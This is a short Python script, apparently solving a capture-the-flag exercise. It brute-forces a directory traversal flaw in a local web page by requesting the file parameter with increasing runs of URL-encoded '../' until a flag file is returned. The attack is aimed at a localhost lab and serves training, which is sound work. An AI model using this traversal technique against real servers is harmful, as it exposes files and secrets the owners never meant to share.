#
# There is a directory traversal vulnerability in the
# following page http://127.0.0.1:8082/humantechconfig?file=human.conf
# Write a script which will attempt various levels of directory
# traversal to find the right amount that will give access
# to the root directory. Inside will be a human.conf with the flag.
#
# Note: The script can timeout. If this occurs try narrowing
# down your search

import urllib.request
import urllib.error

# The URL for the API
url = "http://127.0.0.1:8082/humantechconfig?file=human.conf"
method = "GET"

#attempt to get a file from an unknown level of directory traversal
def get_file(url):
    #make a request to the url
    try:
        req = urllib.request.Request(url)
        #read the response
        response = urllib.request.urlopen(req)
        #decode the response
        the_page = response.read()
        #return the response
        return the_page
    except:
        return None
counter = 0  
while counter<20:
    BaseUrl = "http://127.0.0.1:8082/humantechconfig?file=/"
    suffix = "human.conf"
    UrlMiddle = counter * "%2e%2e/"
    Url = BaseUrl + UrlMiddle + suffix
    print(Url)
    counter += 1
    response = get_file(Url)
    if response != None:
      if "No file" in response.decode():
        continue
      else:
        print(response)
    else:
        continue